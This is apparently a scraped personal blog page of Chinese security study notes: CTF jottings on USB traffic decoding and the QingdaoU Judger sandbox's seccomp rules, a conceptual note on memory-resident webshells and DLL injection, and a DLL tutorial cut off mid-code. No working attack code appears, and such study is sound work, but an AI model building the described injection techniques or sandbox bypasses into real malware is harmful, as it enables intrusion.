-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/python_bypass/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/python_bypass/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-10-09 17:48:02" itemprop="dateCreated datePublished" datetime="2023-10-09T17:48:02+08:00">2023-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-09-09 11:14:24" itemprop="dateModified" datetime="2023-09-09T11:14:24+08:00">2023-09-09</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="LessEQualmore"><a href="#LessEQualmore" class="headerlink" title="LessEQualmore"></a>LessEQualmore</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc chal-lessequalmore.chal.hitconctf.com 11111</span><br><span class="line">flag&#123;1&#125;</span><br><span class="line">*** Flag Checker ***</span><br><span class="line">You entered:</span><br><span class="line">flag&#123;1&#125;</span><br><span class="line">Sorry, wrong flag!</span><br></pre></td></tr></table></figure>
-<h2 id="Not-just-usbpcap"><a href="#Not-just-usbpcap" class="headerlink" title="Not just usbpcap"></a>Not just usbpcap</h2><h3 id="鼠标协议"><a href="#鼠标协议" class="headerlink" title="鼠标协议"></a>鼠标协议</h3><pre><code>  每一个数据包的数据区有四个字节，
-</code></pre><p>第一个字节代表按键，当取 0x00 时，代表没有按键、为 0x01 时，代表按左键，为 0x02 时，代表当前按键为右键。第二个字节可以看成是一个 signed byte 类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。 </p>
-<p>键盘数据包的数据长度为 8 个字节，击键信息集中在第 3 个字节 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r ./release.pcapng -T fields -e usb.capdata &gt;usbdata.txt</span><br><span class="line">python UsbKeyboardDataHacker.py ./release.pcapng</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">l USB UART  异步接收传送器</span><br><span class="line">l USB HID 交互式人性化接口</span><br><span class="line">l USB Memory  数据存储</span><br><span class="line">Audio/Video Distribution Transport Protocol）：</span><br><span class="line"></span><br><span class="line">AVDTP是一种蓝牙协议，用于传输音频和视频数据。它定义了在蓝牙设备之间传输多</span><br><span class="line">媒体数据流的规则和方法。AVDTP的作用是管理多媒体数据的流动，包括数据的传输、控制和同步。</span><br><span class="line">HCI_EVT（Host Controller Interface Event）：</span><br><span class="line"></span><br><span class="line">HCI_EVT是蓝牙协议栈中的一部分，用于管理与蓝牙硬件控制器之间的通信。它定义了一组事件和命令，允许主机设备与蓝牙硬件进行交互，包括连接、数据传输和配置等操作。</span><br><span class="line">USBHUB（USB Hub Protocol）：</span><br><span class="line"></span><br><span class="line">USBHUB是与USB（Universal Serial Bus）相关的协议，用于管理USB集线器（Hub）。USB集线器允许多个USB设备连接到单个USB端口，USBHUB协议定义了集线器的工作原理和与主机设备之间的通信方式。</span><br><span class="line">RTP（Real-time Transport Protocol）：</span><br><span class="line"></span><br><span class="line">RTP是一种用于实时数据传输的协议，通常用于音频和视频流的传输。它提供了时间同步、流标识和数据流传输的机制，以确保实时媒体数据能够以低延迟和高质量传输。RTP通常与RTCP（RTP Control Protocol）一起使用，后者用于监控和管理传输质量。</span><br></pre></td></tr></table></figure>
-<p> <code>Bus 002 Device 002</code> 代表 <code>usb</code> 设备正常连接， </p>
-<h3 id="蓝牙协议"><a href="#蓝牙协议" class="headerlink" title="蓝牙协议"></a>蓝牙协议</h3><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p><img src="/categories/CTF/python_bypass/1694226682107.png" alt="1694226682107"></p>
-<h3 id="后台仓库"><a href="#后台仓库" class="headerlink" title="后台仓库"></a>后台仓库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/QingdaoU/Judger</span><br></pre></td></tr></table></figure>
-<p>main.c</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">max_process_number</span><br><span class="line">max_output_size</span><br><span class="line">exe_path</span><br><span class="line">input_path &quot;/dev/stdin&quot;</span><br><span class="line">output_path</span><br><span class="line">error_path &quot;/dev/stderr&quot;</span><br><span class="line">args</span><br><span class="line"> env</span><br><span class="line"> log_path judger.log</span><br><span class="line"> seccomp_rule_name seccomp_rule_name-&gt;sval[0]</span><br><span class="line"> uid 65534</span><br><span class="line"> gid 65534</span><br></pre></td></tr></table></figure>
-<p>child.c  child_process</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proc = subprocess.Popen(proc_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">out, err = proc.communicate()</span><br><span class="line">return json.loads(out.decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
-<p>general.c</p>
-<ul>
-<li><p>socket、fork、vfork、kill；</p>
-<ul>
-<li>execveat</li>
-</ul>
-<p>禁止以w、rw使用open、openat；</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//c_cpp.c</span><br><span class="line"></span><br><span class="line">&#123;SCMP_SYS(read), SCMP_SYS(fstat),</span><br><span class="line">SCMP_SYS(mmap), SCMP_SYS(mprotect),</span><br><span class="line">SCMP_SYS(munmap), SCMP_SYS(uname),</span><br><span class="line">SCMP_SYS(arch_prctl), SCMP_SYS(brk),</span><br><span class="line">SCMP_SYS(access), SCMP_SYS(exit_group),</span><br><span class="line">SCMP_SYS(close), SCMP_SYS(readlink),</span><br><span class="line">SCMP_SYS(sysinfo), SCMP_SYS(write),</span><br><span class="line">SCMP_SYS(writev), SCMP_SYS(lseek),</span><br><span class="line">SCMP_SYS(clock_gettime), SCMP_SYS(pread64)&#125;; </span><br></pre></td></tr></table></figure>
-<p>  不让写文件时：</p>
-<p>禁止以w、rw使用open、openat；</p>
-<p>或者在允许写文件时：</p>
-<p> 允许进程调用 <code>open</code> 系统调用。 </p>
-<p> 允许进程调用 <code>openat</code> 系统调用，类似于 <code>open</code>，但可以指定文件的相对路径。 </p>
-<p> 允许进程调用 <code>dup2</code> 系统调用，用于复制文件描述符到指定的文件描述符号码。 </p>
-<p> 允许进程调用 <code>dup3</code> 系统调用，类似于 <code>dup2</code>，但支持更多选项 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">max_memory=1024 * 1024 * 128, max_stack=32 * 1024 * 1024,</span><br><span class="line">                   max_process_number=200, max_output_size=10000, exe_path=&quot;1.out&quot;,</span><br><span class="line">                   input_path=&quot;1.in&quot;, output_path=&quot;1.out&quot;, error_path=&quot;1.out&quot;,</span><br><span class="line">                   args=args, env=[&quot;a=&quot;], log_path=&quot;1.log&quot;,</span><br><span class="line">                   seccomp_rule_name=&quot;1.so&quot;, uid=0, gid=0)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#base.py</span><br><span class="line">   config = &#123;&quot;max_cpu_time&quot;: 1000,</span><br><span class="line">                  &quot;max_real_time&quot;: 3000,</span><br><span class="line">                  &quot;max_memory&quot;: 128 * 1024 * 1024,</span><br><span class="line">                  &quot;max_stack&quot;: 32 * 1024 * 1024,</span><br><span class="line">                  &quot;max_process_number&quot;: 10,</span><br><span class="line">                  &quot;max_output_size&quot;: 1024 * 1024,</span><br><span class="line">                  &quot;exe_path&quot;: &quot;/bin/ls&quot;,</span><br><span class="line">                  &quot;input_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;output_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;error_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;args&quot;: [],</span><br><span class="line">                  &quot;env&quot;: [&quot;env=judger_test&quot;, &quot;test=judger&quot;],</span><br><span class="line">                  &quot;log_path&quot;: &quot;judger_test.log&quot;,</span><br><span class="line">                  &quot;seccomp_rule_name&quot;: None,</span><br><span class="line">                  &quot;uid&quot;: 0,</span><br><span class="line">                  &quot;gid&quot;: 0&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def init_workspace(self, language):</span><br><span class="line">    base_workspace = &quot;/tmp&quot;</span><br><span class="line">    workspace = os.path.join(base_workspace, language)</span><br><span class="line">    shutil.rmtree(workspace, ignore_errors=True)</span><br><span class="line">    os.makedirs(workspace)</span><br><span class="line">    return workspace</span><br><span class="line"></span><br><span class="line">def tearDown(self):</span><br><span class="line">    shutil.rmtree(self.workspace, ignore_errors=True)</span><br><span class="line"></span><br><span class="line">def rand_str(self):</span><br><span class="line">    return &quot;&quot;.join([random.choice(&quot;123456789abcdef&quot;) for _ in range(12)])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>相当于12位密码，难以预测。</p>
-<h2 id="Lisp-js"><a href="#Lisp-js" class="headerlink" title="Lisp.js"></a>Lisp.js</h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E5%86%85%E5%AD%98%E9%A9%AC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">Memory-resident Malware</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-09-25 09:58:58 / Modified: 10:16:48" itemprop="dateCreated datePublished" datetime="2023-09-25T09:58:58+08:00">2023-09-25</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>主打隐蔽，：</p>
-<p>内存中，无文件落地到磁盘；</p>
-<ul>
-<li>内核级别操作 rootkit</li>
-<li>在内存中生成文件</li>
-<li><strong>反射式DLL注入</strong>：这是一种技术，它允许恶意软件在不使用硬盘上的文件的情况下，将DLL注入到进程的内存中。 </li>
-<li><p><strong>进程注入</strong>：攻击者可以将自己的恶意进程注入到合法进程的地址空间中 </p>
-</li>
-<li><p><strong>DLL注入</strong>：恶意软件可以注入恶意动态链接库（DLL）到其他进程的内存中 </p>
-</li>
-</ul>
-<h2 id="Webshell的内存马分类："><a href="#Webshell的内存马分类：" class="headerlink" title="Webshell的内存马分类："></a>Webshell的内存马分类：</h2><p>1.servlet-api型<br>通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马</p>
-<p>2.字节码增强型<br>通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。</p>
-<p>客户端—&gt;Listener—&gt;Filter—&gt;Servlet</p>
-<p> 在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理 ；</p>
-<p> Filter.doFilter  —&gt; 调用 FilterChain.doFilter ( FilterChain Object)—&gt; 激活目标 Servlet 的 service  ；</p>
-<p> filter链<br>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。 </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/Linkers&Loaders05/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/Linkers&Loaders05/" class="post-title-link" itemprop="url">Chap09-DLL</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-09-08 17:58:58 / Modified: 18:11:44" itemprop="dateCreated datePublished" datetime="2023-09-08T17:58:58+08:00">2023-09-08</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="DLL-模块"><a href="#DLL-模块" class="headerlink" title="DLL 模块"></a>DLL 模块</h2><ul>
-<li>.dll</li>
-<li>.ocx, （Ole Control Extension） ，OCX控件，新的应用程序基本不再使用。</li>
-<li>.cpl,控制面板程序 ，双击即可启动。</li>
-</ul>
-<p>微软的补丁，通常是待更新的dll积累到一定程度后的一个Service Packs软件更新包。</p>
-<p>ELF的动态链接可以运行时加载，Win下用这种技术用得更多，例如ActiveX。</p>
-<p>Win32以后，进程有独立的地址空间，一个dll文件在不同的经常内部拥有不同的私有数据副本。</p>
-<p><strong>ELF的代码段是地址无关的，而DLL的代码并不是地址无关。</strong></p>
-<h3 id="DLL共享利用点："><a href="#DLL共享利用点：" class="headerlink" title="DLL共享利用点："></a>DLL共享利用点：</h3><p>DLL共享数据段实现进程间通信，此时，dll中往往有两个数据段，一个是把共享的数据单独拿出来作为一个段的进程间共享数据段，另一个私有。</p>
-<p>GUEST权限的用户可以通过修改DLL里的共享数据，影响到其他使用该 DLL文件的进程。因此，DLL共享数据段实现进程间通信应该尽量避免。</p>
-<h2 id="Dll开发"><a href="#Dll开发" class="headerlink" title="Dll开发"></a>Dll开发</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//防止C++编译器进行符号修饰</span></span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Add</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 减法函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Subtract</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 乘法函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">double</span> <span class="title">Multiply</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dumpbin /EXPORTS Dll1.dll</span><br><span class="line"></span><br><span class="line">    ordinal hint RVA      name</span><br><span class="line"></span><br><span class="line">          1    0 000110A0 Add</span><br><span class="line">          2    1 00011271 Multiply</span><br><span class="line">          3    2 000111C7 Subtract</span><br></pre></td></tr></table></figure>
-<p>​    .lib文件是一组目标文件的集合。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//加载静态链接库</span><br><span class="line">#pragma comment(lib,&quot;../Debug/libMathFunctions.lib&quot;)</span><br></pre></td></tr></table></figure>
-<h2 id="加载动态链接库"><a href="#加载动态链接库" class="headerlink" title="加载动态链接库"></a>加载动态链接库</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/houkai/archive/2013/06/05/3119513.html">https://www.cnblogs.com/houkai/archive/2013/06/05/3119513.html</a></p>
-</blockquote>
-<h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><p>1.2. 修改包含目录(.h所在文件)和库目录(.lib所在目录)</p>
-<p><img src="/categories/Notes/Linkers&Loaders05/1694166330701.png" alt="1694166330701"></p>
-<p>3.项目-&gt;属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt; 在“附加依赖项”里添加“testdll.lib”（</p>
-<p>若有多个 lib 则以空格隔开） </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型（导入DLL中的函数）</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Add</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Subtract</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="type">double</span> <span class="title">Multiply</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的加法函数</span></span><br><span class="line">    <span class="type">double</span> sum = <span class="built_in">Add</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; sum &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的减法函数</span></span><br><span class="line">    <span class="type">double</span> difference = <span class="built_in">Subtract</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; difference &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用DLL中的乘法函数</span></span><br><span class="line">    <span class="type">double</span> product = <span class="built_in">Multiply</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; product &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>Ctrl+F7编译通过，但是程序运行就报错，</p>
-<p>还需要将testdll.dll复制到当前项目生成的可执行文件所在的目录。 </p>
-<h3 id="显示链接"><a href="#显示链接" class="headerlink" title="显示链接"></a>显示链接</h3><p> 项目菜单——项目属性——配置属性——常规——高级——字符集，将使用Unicode字符集改为未设置即可。 </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*pAdd)</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*pSubtract)</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hDLL = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;Dll1.dll&quot;</span>); <span class="comment">//加载dll文件，需要把dll拷贝到当前目录 </span></span><br><span class="line">    <span class="keyword">if</span> (hDLL != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pAdd fp1 = <span class="built_in">pAdd</span>(<span class="built_in">GetProcAddress</span>(hDLL, <span class="built_in">MAKEINTRESOURCE</span>(<span class="number">1</span>))); <span class="comment">//得到dll中的第一个函数</span></span><br><span class="line">        <span class="keyword">if</span> (fp1 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="built_in">fp1</span>(<span class="number">2.5</span>, <span class="number">5.5</span>) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Cannot Find Function &quot;</span> &lt;&lt; <span class="string">&quot;add&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        pSubtract 